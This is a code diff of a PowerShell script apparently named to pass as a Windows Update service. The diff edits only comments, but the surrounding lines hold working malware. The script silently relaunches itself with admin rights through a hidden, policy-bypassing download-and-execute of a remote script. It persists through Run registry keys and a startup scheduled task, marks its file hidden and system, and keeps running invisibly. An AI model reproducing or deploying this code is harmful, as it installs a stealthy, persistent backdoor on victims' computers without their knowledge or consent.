@@ -3,7 +3,6 @@ $serverPort = 4000
 $installName = "WinUpdateSvc"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
-# ===== VERIFICAR ADMIN =====
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
     try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
@@ -20,12 +19,12 @@ if ($args -notcontains "-silent") {
     
     $argList = "-nop -w hidden -ep bypass -f `"$scriptPath`" -silent"
     
-    # 1. Persistência via Registro
+    # Persistência via Registro
     $cmd = "powershell.exe $argList"
     Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
     
-    # 2. Persistência via Agendador de Tarefas (SYSTEM)
+    # Persistência via Agendador
     try {
         $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $argList
         $trigger1 = New-ScheduledTaskTrigger -AtStartup
@@ -37,7 +36,7 @@ if ($args -notcontains "-silent") {
     
     attrib +h +s +r $scriptPath 2>$null
     
-    # 3. Esconde a janela e inicia o modo invisível
+    # Inicia o modo invisível e fecha a janela atual
     Start-Process powershell.exe -ArgumentList $argList -WindowStyle Hidden
     exit
 }
